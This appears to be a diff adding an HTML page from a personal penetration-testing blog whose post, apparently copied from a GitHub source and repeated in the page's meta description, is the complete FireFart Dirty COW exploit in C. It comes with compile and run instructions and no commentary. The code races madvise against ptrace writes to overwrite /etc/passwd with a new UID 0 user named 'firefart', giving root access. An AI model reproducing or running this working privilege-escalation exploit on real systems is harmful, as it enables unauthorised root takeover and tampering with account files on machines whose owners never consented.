@@ -1,0 +1,677 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>C0w | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+Compile with:
+&amp;#x2F;&amp;#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
+&amp;#x2F;&amp;#x2F;
+&amp;#x2F;&amp;#x2F; Then run the newly create binary by either doing:
+&amp;#x2F;&amp;#x2F;   &amp;quot;.&amp;#x2F;dirty&amp;quot; or &amp;quot;.&amp;#x2F;dirty my-new-password&amp;quot;
+&amp;#x2F;&amp;#x2F;
+&amp;#x2F;&amp;#x2F; Afterwards, you can either &amp;quot;su firefart&amp;quot; or &amp;quot;ssh firefart@...&amp;quot;
+&amp;#x2F;&amp;#x2F;
+&amp;#x2F;&amp;#x2F; DON&amp;#39;T FORGET TO RESTORE YOUR &amp;#x2F;etc&amp;#x2F;passwd AFTER RUNNING THE EXPLOIT!
+&amp;#x2F;&amp;#x2F;   mv &amp;#x2F;tmp&amp;#x2F;passwd.bak &amp;#x2F;etc&amp;#x2F;passwd
+
+
+&amp;#x2F;&amp;#x2F;
+&amp;#x2F;&amp;#x2F; This exploit uses the pokemon exploit of the dirtycow vulnerability
+&amp;#x2F;&amp;#x2F; as a base and automatically generates a new passwd line.
+&amp;#x2F;&amp;#x2F; The user will be prompted for the new password when the binary is run.
+&amp;#x2F;&amp;#x2F; The original &amp;#x2F;etc&amp;#x2F;passwd file is then backed up to &amp;#x2F;tmp&amp;#x2F;passwd.bak
+&amp;#x2F;&amp;#x2F; and overwrites the root account with the generated line.
+&amp;#x2F;&amp;#x2F; After running the exploit you should be able to login with the newly
+&amp;#x2F;&amp;#x2F; created user.
+&amp;#x2F;&amp;#x2F;
+&amp;#x2F;&amp;#x2F; To use this exploit modify the user values according to your needs.
+&amp;#x2F;&amp;#x2F;   The default is &amp;quot;firefart&amp;quot;.
+&amp;#x2F;&amp;#x2F;
+&amp;#x2F;&amp;#x2F; Original exploit (dirtycow&amp;#39;s ptrace_pokedata &amp;quot;pokemon&amp;quot; method):
+&amp;#x2F;&amp;#x2F;   https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;dirtycow&amp;#x2F;dirtycow.github.io&amp;#x2F;blob&amp;#x2F;master&amp;#x2F;pokemon.c
+&amp;#x2F;&amp;#x2F;
+&amp;#x2F;&amp;#x2F; Compile with:
+&amp;#x2F;&amp;#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
+&amp;#x2F;&amp;#x2F;
+&amp;#x2F;&amp;#x2F; Then run the newly create binary by either doing:
+&amp;#x2F;&amp;#x2F;   &amp;quot;.&amp;#x2F;dirty&amp;quot; or &amp;quot;.&amp;#x2F;dirty my-new-password&amp;quot;
+&amp;#x2F;&amp;#x2F;
+&amp;#x2F;&amp;#x2F; Afterwards, you can either &amp;quot;su firefart&amp;quot; or &amp;quot;ssh firefart@...&amp;quot;
+&amp;#x2F;&amp;#x2F;
+&amp;#x2F;&amp;#x2F; DON&amp;#39;T FORGET TO RESTORE YOUR &amp;#x2F;etc&amp;#x2F;passwd AFTER RUNNING THE EXPLOIT!
+&amp;#x2F;&amp;#x2F;   mv &amp;#x2F;tmp&amp;#x2F;passwd.bak &amp;#x2F;etc&amp;#x2F;passwd
+&amp;#x2F;&amp;#x2F;
+&amp;#x2F;&amp;#x2F; Exploit adopted by Christian &amp;quot;FireFart&amp;quot; Mehlmauer
+&amp;#x2F;&amp;#x2F; https:&amp;#x2F;&amp;#x2F;firefart.at
+&amp;#x2F;&amp;#x2F;
+
+#include &amp;lt;fcntl.h&amp;gt;
+#include &amp;lt;pthread.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdint.h&amp;gt;
+#include &amp;lt;sys&amp;#x2F;mman.h&amp;gt;
+#include &amp;lt;sys&amp;#x2F;types.h&amp;gt;
+#include &amp;lt;sys&amp;#x2F;stat.h&amp;gt;
+#include &amp;lt;sys&amp;#x2F;wait.h&amp;gt;
+#include &amp;lt;sys&amp;#x2F;ptrace.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;crypt.h&amp;gt;
+
+const char *filename &amp;#x3D; &amp;quot;&amp;#x2F;etc&amp;#x2F;passwd&amp;quot;;
+const char *backup_filename &amp;#x3D; &amp;quot;&amp;#x2F;tmp&amp;#x2F;passwd.bak&amp;quot;;
+const char *salt &amp;#x3D; &amp;quot;firefart&amp;quot;;
+
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+
+struct Userinfo &amp;#123;
+   char *username;
+   char *hash;
+   int user_id;
+   int group_id;
+   char *info;
+   char *home_dir;
+   char *shell;
+&amp;#125;;
+
+char *generate_password_hash(char *plaintext_pw) &amp;#123;
+  return crypt(plaintext_pw, salt);
+&amp;#125;
+
+char *generate_passwd_line(struct Userinfo u) &amp;#123;
+  const char *format &amp;#x3D; &amp;quot;%s:%s:%d:%d:%s:%s:%s\n&amp;quot;;
+  int size &amp;#x3D; snprintf(NULL, 0, format, u.username, u.hash,
+    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
+  char *ret &amp;#x3D; malloc(size + 1);
+  sprintf(ret, format, u.username, u.hash, u.user_id,
+    u.group_id, u.info, u.home_dir, u.shell);
+  return ret;
+&amp;#125;
+
+void *madviseThread(void *arg) &amp;#123;
+  int i, c &amp;#x3D; 0;
+  for(i &amp;#x3D; 0; i &amp;lt; 200000000; i++) &amp;#123;
+    c +&amp;#x3D; madvise(map, 100, MADV_DONTNEED);
+  &amp;#125;
+  printf(&amp;quot;madvise %d\n\n&amp;quot;, c);
+&amp;#125;
+
+int copy_file(const char *from, const char *to) &amp;#123;
+  &amp;#x2F;&amp;#x2F; check if target file already exists
+  if(access(to, F_OK) !&amp;#x3D; -1) &amp;#123;
+    printf(&amp;quot;File %s already exists! Please delete it and run again\n&amp;quot;,
+      to);
+    return -1;
+  &amp;#125;
+
+  char ch;
+  FILE *source, *target;
+
+  source &amp;#x3D; fopen(from, &amp;quot;r&amp;quot;);
+  if(source &amp;#x3D;&amp;#x3D; NULL) &amp;#123;
+    return -1;
+  &amp;#125;
+  target &amp;#x3D; fopen(to, &amp;quot;w&amp;quot;);
+  if(target &amp;#x3D;&amp;#x3D; NULL) &amp;#123;
+     fclose(source);
+     return -1;
+  &amp;#125;
+
+  while((ch &amp;#x3D; fgetc(source)) !&amp;#x3D; EOF) &amp;#123;
+     fputc(ch, target);
+   &amp;#125;
+
+  printf(&amp;quot;%s successfully backed up to %s\n&amp;quot;,
+    from, to);
+
+  fclose(source);
+  fclose(target);
+
+  return 0;
+&amp;#125;
+
+int main(int argc, char *argv[])
+&amp;#123;
+  &amp;#x2F;&amp;#x2F; backup file
+  int ret &amp;#x3D; copy_file(filename, backup_filename);
+  if (ret !&amp;#x3D; 0) &amp;#123;
+    exit(ret);
+  &amp;#125;
+
+  struct Userinfo user;
+  &amp;#x2F;&amp;#x2F; set values, change as needed
+  user.username &amp;#x3D; &amp;quot;firefart&amp;quot;;
+  user.user_id &amp;#x3D; 0;
+  user.group_id &amp;#x3D; 0;
+  user.info &amp;#x3D; &amp;quot;pwned&amp;quot;;
+  user.home_dir &amp;#x3D; &amp;quot;&amp;#x2F;root&amp;quot;;
+  user.shell &amp;#x3D; &amp;quot;&amp;#x2F;bin&amp;#x2F;bash&amp;quot;;
+
+  char *plaintext_pw;
+
+  if (argc &amp;gt;&amp;#x3D; 2) &amp;#123;
+    plaintext_pw &amp;#x3D; argv[1];
+    printf(&amp;quot;Please enter the new password: %s\n&amp;quot;, plaintext_pw);
+  &amp;#125; else &amp;#123;
+    plaintext_pw &amp;#x3D; getpass(&amp;quot;Please enter the new password: &amp;quot;);
+  &amp;#125;
+
+  user.hash &amp;#x3D; generate_password_hash(plaintext_pw);
+  char *complete_passwd_line &amp;#x3D; generate_passwd_line(user);
+  printf(&amp;quot;Complete line:\n%s\n&amp;quot;, complete_passwd_line);
+
+  f &amp;#x3D; open(filename, O_RDONLY);
+  fstat(f, &amp;amp;st);
+  map &amp;#x3D; mmap(NULL,
+             st.st_size + sizeof(long),
+             PROT_READ,
+             MAP_PRIVATE,
+             f,
+             0);
+  printf(&amp;quot;mmap: %lx\n&amp;quot;,(unsigned long)map);
+  pid &amp;#x3D; fork();
+  if(pid) &amp;#123;
+    waitpid(pid, NULL, 0);
+    int u, i, o, c &amp;#x3D; 0;
+    int l&amp;#x3D;strlen(complete_passwd_line);
+    for(i &amp;#x3D; 0; i &amp;lt; 10000&amp;#x2F;l; i++) &amp;#123;
+      for(o &amp;#x3D; 0; o &amp;lt; l; o++) &amp;#123;
+        for(u &amp;#x3D; 0; u &amp;lt; 10000; u++) &amp;#123;
+          c +&amp;#x3D; ptrace(PTRACE_POKETEXT,
+                      pid,
+                      map + o,
+                      *((long*)(complete_passwd_line + o)));
+        &amp;#125;
+      &amp;#125;
+    &amp;#125;
+    printf(&amp;quot;ptrace %d\n&amp;quot;,c);
+  &amp;#125;
+  else &amp;#123;
+    pthread_create(&amp;amp;pth,
+                   NULL,
+                   madviseThread,
+                   NULL);
+    ptrace(PTRACE_TRACEME);
+    kill(getpid(), SIGSTOP);
+    pthread_join(pth,NULL);
+  &amp;#125;
+
+  printf(&amp;quot;Done! Check %s to see if the new user was created.\n&amp;quot;, filename);
+  printf(&amp;quot;You can log in with the username &amp;#39;%s&amp;#39; and the password &amp;#39;%s&amp;#39;.\n\n&amp;quot;,
+    user.username, plaintext_pw);
+    printf(&amp;quot;\nDON&amp;#39;T FORGET TO RESTORE! $ mv %s %s\n&amp;quot;,
+    backup_filename, filename);
+  return 0;
+&amp;#125;"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="C0w"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> C0w</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</a></p>
+<pre class="line-numbers language-none"><code class="language-none">Compile with:
+&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
+&#x2F;&#x2F;
+&#x2F;&#x2F; Then run the newly create binary by either doing:
+&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
+&#x2F;&#x2F;
+&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
+&#x2F;&#x2F;
+&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
+&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;
+&#x2F;&#x2F; This exploit uses the pokemon exploit of the dirtycow vulnerability
+&#x2F;&#x2F; as a base and automatically generates a new passwd line.
+&#x2F;&#x2F; The user will be prompted for the new password when the binary is run.
+&#x2F;&#x2F; The original &#x2F;etc&#x2F;passwd file is then backed up to &#x2F;tmp&#x2F;passwd.bak
+&#x2F;&#x2F; and overwrites the root account with the generated line.
+&#x2F;&#x2F; After running the exploit you should be able to login with the newly
+&#x2F;&#x2F; created user.
+&#x2F;&#x2F;
+&#x2F;&#x2F; To use this exploit modify the user values according to your needs.
+&#x2F;&#x2F;   The default is &quot;firefart&quot;.
+&#x2F;&#x2F;
+&#x2F;&#x2F; Original exploit (dirtycow&#39;s ptrace_pokedata &quot;pokemon&quot; method):
+&#x2F;&#x2F;   https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;pokemon.c
+&#x2F;&#x2F;
+&#x2F;&#x2F; Compile with:
+&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
+&#x2F;&#x2F;
+&#x2F;&#x2F; Then run the newly create binary by either doing:
+&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
+&#x2F;&#x2F;
+&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
+&#x2F;&#x2F;
+&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
+&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
+&#x2F;&#x2F;
+&#x2F;&#x2F; Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer
+&#x2F;&#x2F; https:&#x2F;&#x2F;firefart.at
+&#x2F;&#x2F;
+
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;sys&#x2F;mman.h&gt;
+#include &lt;sys&#x2F;types.h&gt;
+#include &lt;sys&#x2F;stat.h&gt;
+#include &lt;sys&#x2F;wait.h&gt;
+#include &lt;sys&#x2F;ptrace.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;crypt.h&gt;
+
+const char *filename &#x3D; &quot;&#x2F;etc&#x2F;passwd&quot;;
+const char *backup_filename &#x3D; &quot;&#x2F;tmp&#x2F;passwd.bak&quot;;
+const char *salt &#x3D; &quot;firefart&quot;;
+
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+
+struct Userinfo &#123;
+   char *username;
+   char *hash;
+   int user_id;
+   int group_id;
+   char *info;
+   char *home_dir;
+   char *shell;
+&#125;;
+
+char *generate_password_hash(char *plaintext_pw) &#123;
+  return crypt(plaintext_pw, salt);
+&#125;
+
+char *generate_passwd_line(struct Userinfo u) &#123;
+  const char *format &#x3D; &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;
+  int size &#x3D; snprintf(NULL, 0, format, u.username, u.hash,
+    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
+  char *ret &#x3D; malloc(size + 1);
+  sprintf(ret, format, u.username, u.hash, u.user_id,
+    u.group_id, u.info, u.home_dir, u.shell);
+  return ret;
+&#125;
+
+void *madviseThread(void *arg) &#123;
+  int i, c &#x3D; 0;
+  for(i &#x3D; 0; i &lt; 200000000; i++) &#123;
+    c +&#x3D; madvise(map, 100, MADV_DONTNEED);
+  &#125;
+  printf(&quot;madvise %d\n\n&quot;, c);
+&#125;
+
+int copy_file(const char *from, const char *to) &#123;
+  &#x2F;&#x2F; check if target file already exists
+  if(access(to, F_OK) !&#x3D; -1) &#123;
+    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,
+      to);
+    return -1;
+  &#125;
+
+  char ch;
+  FILE *source, *target;
+
+  source &#x3D; fopen(from, &quot;r&quot;);
+  if(source &#x3D;&#x3D; NULL) &#123;
+    return -1;
+  &#125;
+  target &#x3D; fopen(to, &quot;w&quot;);
+  if(target &#x3D;&#x3D; NULL) &#123;
+     fclose(source);
+     return -1;
+  &#125;
+
+  while((ch &#x3D; fgetc(source)) !&#x3D; EOF) &#123;
+     fputc(ch, target);
+   &#125;
+
+  printf(&quot;%s successfully backed up to %s\n&quot;,
+    from, to);
+
+  fclose(source);
+  fclose(target);
+
+  return 0;
+&#125;
+
+int main(int argc, char *argv[])
+&#123;
+  &#x2F;&#x2F; backup file
+  int ret &#x3D; copy_file(filename, backup_filename);
+  if (ret !&#x3D; 0) &#123;
+    exit(ret);
+  &#125;
+
+  struct Userinfo user;
+  &#x2F;&#x2F; set values, change as needed
+  user.username &#x3D; &quot;firefart&quot;;
+  user.user_id &#x3D; 0;
+  user.group_id &#x3D; 0;
+  user.info &#x3D; &quot;pwned&quot;;
+  user.home_dir &#x3D; &quot;&#x2F;root&quot;;
+  user.shell &#x3D; &quot;&#x2F;bin&#x2F;bash&quot;;
+
+  char *plaintext_pw;
+
+  if (argc &gt;&#x3D; 2) &#123;
+    plaintext_pw &#x3D; argv[1];
+    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);
+  &#125; else &#123;
+    plaintext_pw &#x3D; getpass(&quot;Please enter the new password: &quot;);
+  &#125;
+
+  user.hash &#x3D; generate_password_hash(plaintext_pw);
+  char *complete_passwd_line &#x3D; generate_passwd_line(user);
+  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);
+
+  f &#x3D; open(filename, O_RDONLY);
+  fstat(f, &amp;st);
+  map &#x3D; mmap(NULL,
+             st.st_size + sizeof(long),
+             PROT_READ,
+             MAP_PRIVATE,
+             f,
+             0);
+  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);
+  pid &#x3D; fork();
+  if(pid) &#123;
+    waitpid(pid, NULL, 0);
+    int u, i, o, c &#x3D; 0;
+    int l&#x3D;strlen(complete_passwd_line);
+    for(i &#x3D; 0; i &lt; 10000&#x2F;l; i++) &#123;
+      for(o &#x3D; 0; o &lt; l; o++) &#123;
+        for(u &#x3D; 0; u &lt; 10000; u++) &#123;
+          c +&#x3D; ptrace(PTRACE_POKETEXT,
+                      pid,
+                      map + o,
+                      *((long*)(complete_passwd_line + o)));
+        &#125;
+      &#125;
+    &#125;
+    printf(&quot;ptrace %d\n&quot;,c);
+  &#125;
+  else &#123;
+    pthread_create(&amp;pth,
+                   NULL,
+                   madviseThread,
+                   NULL);
+    ptrace(PTRACE_TRACEME);
+    kill(getpid(), SIGSTOP);
+    pthread_join(pth,NULL);
+  &#125;
+
+  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);
+  printf(&quot;You can log in with the username &#39;%s&#39; and the password &#39;%s&#39;.\n\n&quot;,
+    user.username, plaintext_pw);
+    printf(&quot;\nDON&#39;T FORGET TO RESTORE! $ mv %s %s\n&quot;,
+    backup_filename, filename);
+  return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2017/09/12/c0w.html" class="leancloud-visitors view" data-flag-title="C0w">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2017/09/26/VerifyCode.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/08/15/elk_basic.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-09-12 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
